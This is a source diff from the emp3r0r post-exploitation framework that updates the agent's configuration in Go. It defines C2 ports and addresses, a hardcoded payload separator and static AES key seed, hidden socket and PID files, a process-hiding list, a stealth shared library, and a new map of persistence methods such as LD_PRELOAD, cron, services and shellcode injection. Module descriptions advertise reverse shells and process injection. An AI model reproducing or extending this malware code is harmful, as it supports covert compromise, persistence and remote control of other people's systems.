@@ -1,13 +1,11 @@
-package agent
+package emp3r0r_data
 
 import (
 	"context"
-	"fmt"
 	"net/http"
 	"os"
 	"strconv"
 
-	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/posener/h2conn"
 	"github.com/txthinking/socks5"
 )
@@ -20,10 +18,10 @@ var (
 	CCIP = ""
 
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
-	Transport = fmt.Sprintf("HTTP2 (%s)", CCAddress)
+	Transport = "HTTP2"
 
-	// AESKey preshared []byte AESKey for AES encrypt/decrypt
-	AESKey = tun.GenAESKey("Your Pre Shared AES Key: " + OpSep)
+	// AESKey generated from Tag -> md5sum, type: []byte
+	AESKey = genAESKey("Your Pre Shared AES Key: " + OpSep)
 
 	// HTTPClient handles agent's http communication
 	HTTPClient *http.Client
@@ -37,7 +35,10 @@ var (
 	// AgentProxy used by this agent to communicate with CC server
 	AgentProxy = ""
 
-	// HIDE_PIDS all the processeserr from emp3r0r
+	// SocketName name of our unix socket
+	SocketName = AgentRoot + "/.s6Y4tDtahIuL"
+
+	// HIDE_PIDS all the processes
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
 
 	// GuardianShellcode inject into a process to gain persistence
@@ -46,29 +47,23 @@ var (
 	// GuardianAgentPath where the agent binary is stored
 	GuardianAgentPath = "[persistence_agent_path]"
 
-	/*
-		config vars
-	*/
 	// Version record version on build time
-	Version = "[emp3r0r_version_string]"
+	Version = "[version_string]"
 
-	// AgentRoot root directory of emp3r0r
-	AgentRoot = "[agent_root]"
-
-	// CCIndicatorText content of the cc indicator file
-	CCIndicatorText = "[agent_cc_text]"
+	// AgentRoot root directory
+	AgentRoot = ".agent"
 
 	// UtilsPath binary path of utilities
 	UtilsPath = AgentRoot + "/bin"
 
 	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
-	Libemp3r0rFile = UtilsPath + "/libemp3r0r.so"
+	Libemp3r0rFile = UtilsPath + "/libe.so"
 
 	// PIDFile stores agent PID
 	PIDFile = AgentRoot + "/.e.lock"
 
 	// SocketName name of our unix socket
-	SocketName = AgentRoot + "/.s6Y4tDtahIuL"
+	// SocketName = AgentRoot + "/.s6Y4tDtahIuL"
 
 	// CCPort port of c2
 	CCPort = "[cc_port]"
@@ -76,31 +71,52 @@ var (
 	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
 	ProxyPort = "[proxy_port]"
 
+	// SSHDPort port of sshd
+	SSHDPort = "[sshd_port]"
+
 	// ReverseProxyPort for reverse proxy
-	ReverseProxyPort = calculateReverseProxyPort()
+	ReverseProxyPort = ""
 
 	// BroadcastPort port of broadcast server
 	BroadcastPort = "[broadcast_port]"
 
-	// SSHDPort port of sshd
-	SSHDPort = "[sshd_port]"
+	// BroadcastIntervalMin broadcast wait seconds
+	BroadcastIntervalMin = 30
+
+	// BroadcastIntervalMax broadcast wait seconds
+	BroadcastIntervalMax = 120
 
 	// CCIndicator check this before trying connection
 	CCIndicator = "[cc_indicator]"
 
-	// Tag uuid of this agent
-	Tag = "[agent_uuid]"
+	// CCIndicatorText content of your indicator file
+	CCIndicatorText = "[indicator_text]"
 
-	// OpSep separator of CC payload, has to stay static, can be modified at compile-time
-	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"
+	// IndicatorWaitMin cc indicator wait seconds
+	IndicatorWaitMin = 30
+
+	// IndicatorWaitMax cc indicator wait seconds
+	IndicatorWaitMax = 120
+
+	// AgentUUID uuid of this agent
+	AgentUUID = "[agent_uuid]"
+
+	// AgenTag tag of this agent
+	AgentTag = ""
 )
 
 const (
+	// OpSep separator of CC payload
+	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"
+
 	// RShellBufSize buffer size of reverse shell stream
 	RShellBufSize = 128
 
 	// ProxyBufSize buffer size of port fwd
 	ProxyBufSize = 1024
+
+	// Unknown
+	Unknown = "Unknown"
 )
 
 // Module names
@@ -118,6 +134,16 @@ const (
 	ModREVERSEPROXY = "reverse_proxy"
 )
 
+// PersistMethods CC calls one of these methods to get persistence, or all of them at once
+var PersistMethods = map[string]string{
+	"ld_preload": "ldPreload",
+	"profiles":   "profiles",
+	"service":    "service",
+	"injector":   "injector",
+	"cron":       "cronJob",
+	"patcher":    "patcher",
+}
+
 // Module help info
 var ModuleDocs = map[string]string{
 	ModCMD_EXEC:     "Run a single command on a target",
@@ -125,7 +151,7 @@ var ModuleDocs = map[string]string{
 	ModLPE_SUGGEST:  "Run linux-smart-enumeration or linux exploit suggester",
 	ModPERSISTENCE:  "Get persistence via built-in methods",
 	ModPROXY:        "Start a socks proxy on target, and use it locally on C2 side",
-	ModPORT_FWD:     "Port mapping from agent to CC (or vice versa), via emp3r0r's HTTP2 (or other) tunnel",
+	ModPORT_FWD:     "Port mapping from agent to CC (or vice versa), via HTTP2 (or other) tunnel",
 	ModSHELL:        "Run custom bash on target, a perfect reverse shell",
 	ModVACCINE:      "Vaccine helps you install additional tools on target system",
 	ModINJECTOR:     "Inject shellcode into a running process with GDB",
@@ -133,6 +159,26 @@ var ModuleDocs = map[string]string{
 	ModREVERSEPROXY: "Manually proxy agents who are unable to use our forward proxy",
 }
 
+// Config build.json config file
+type Config struct {
+	Version              string `json:"version"`                // agent version
+	CCPort               string `json:"cc_port"`                // "cc_port": "5381",
+	ProxyPort            string `json:"proxy_port"`             // "proxy_port": "56238",
+	SSHDPort             string `json:"sshd_port"`              // "sshd_port": "2222",
+	BroadcastPort        string `json:"broadcast_port"`         // "broadcast_port": "58485",
+	BroadcastIntervalMin int    `json:"broadcast_interval_min"` // "broadcast_interval_min": 60, // seconds, set max to 0 to disable
+	BroadcastIntervalMax int    `json:"broadcast_interval_max"` // "broadcast_interval_max": 120, // seconds, set max to 0 to disable
+	CCIP                 string `json:"ccip"`                   // "ccip": "192.168.40.137",
+	AgentRoot            string `json:"agent_root"`             // "agent_root": "/dev/shm/.848ba",
+	PIDFile              string `json:"pid_file"`               // "pid_file": ".848ba.pid",
+	CCIndicator          string `json:"cc_indicator"`           // "cc_indicator": "cc_indicator",
+	IndicatorWaitMin     int    `json:"indicator_wait_min"`     // "indicator_wait_min": 60, // seconds
+	IndicatorWaitMax     int    `json:"indicator_wait_max"`     // "indicator_wait_max": 120, // seconds, set max to 0 to disable
+	CCIndicatorText      string `json:"indicator_text"`         // "indicator_text": "myawesometext"
+	CA                   string `json:"ca"`                     // CA cert from server side
+}
+
+// SystemInfo agent properties
 type SystemInfo struct {
 	Tag         string        `json:"Tag"`         // identifier of the agent
 	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
